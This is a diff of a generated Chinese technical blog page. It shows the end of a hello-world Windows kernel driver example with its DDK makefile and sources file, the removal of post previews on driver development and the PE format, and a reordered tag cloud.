ntStatus = IoCreateSymbolicLink(&amp;symLinkName,&amp;devName);</span><br><span class="line">	if(!NT_SUCCESS(ntStatus))</span><br><span class="line">	&#123;</span><br><span class="line">		IoDeleteDevice(g_DeviceObject);</span><br><span class="line">		return ntStatus;</span><br><span class="line">	&#125;</span><br><span class="line">	//设置该驱动对象的派遣例程函数</span><br><span class="line">	for(i=0; i&lt;IRP_MJ_MAXIMUM_FUNCTION;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		driverObject-&gt;MajorFunction[i] = DrvDispatch;</span><br><span class="line">	&#125;</span><br><span class="line">	//返回成功结果</span><br><span class="line">	return STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">makefile文件:</span><br><span class="line">固定格式</span><br><span class="line">!IF 0</span><br><span class="line">Copyright (C) Microsoft Corporation, 1999 - 2002</span><br><span class="line">Module Name:</span><br><span class="line">    makefile.</span><br><span class="line">Notes:</span><br><span class="line">    DO NOT EDIT THIS FILE!!! Edit .\sources. if you want to add a new source file</span><br><span class="line">    to this component. This file merrely indirects to the real make file that is  </span><br><span class="line">    shared by all the components of Windows Nt (DDK)</span><br><span class="line">!ENDIF</span><br><span class="line">!INCLUDES $(NTMAKEENV)\makefile.def</span><br><span class="line"></span><br><span class="line">source文件:</span><br><span class="line">TARGETNAME=helloworld</span><br><span class="line">TARGETTYPE=DRIVER</span><br><span class="line">SOURCES=helloworld.c</span><br></pre></td></tr></table></figure>
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Window编程原理</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/08/20/驱动开发/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
- <!-- 目录内容 -->
-             
-        <!-- 目录内容结束 -->
-
-  
-    <article id="post-PE文件数据结构" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/08/20/PE文件数据结构/">PE文件数据结构</a>
-    </h1>
-  
-
-		
-        
-        <a href="/2018/08/20/PE文件数据结构/" class="archive-article-date">
-  	<time datetime="2018-08-20T08:46:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-20</time>
-</a>
-        
-      </header>
-
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <blockquote>
-<p>IMAGE_DOS_HEADER dos头部</p>
-</blockquote>
-        
-          <a class="article-more-a" href="/2018/08/20/PE文件数据结构/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Window编程原理</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/08/20/PE文件数据结构/">展开全文 >></a>
         </p>
       
 
@@ -1112,7 +1148,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">C++</a>
+                <a href="javascript:void(0)" class="js-tag color5">shellcode</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">Window编程原理</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1121,10 +1161,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">笔记</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">Window编程原理</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1144,6 +1180,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">C++</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">vsfptd</a>
               </li>
              
@@ -1160,6 +1200,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">漏洞分析</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">kail</a>
               </li>
              
@@ -1168,7 +1212,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">漏洞分析</a>
+                <a href="javascript:void(0)" class="js-tag color3">思考</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1180,19 +1224,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">思考</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">汇编</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">dll注入</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">shellcode</a>
               </li>
              
               <li class="article-tag-list-item">
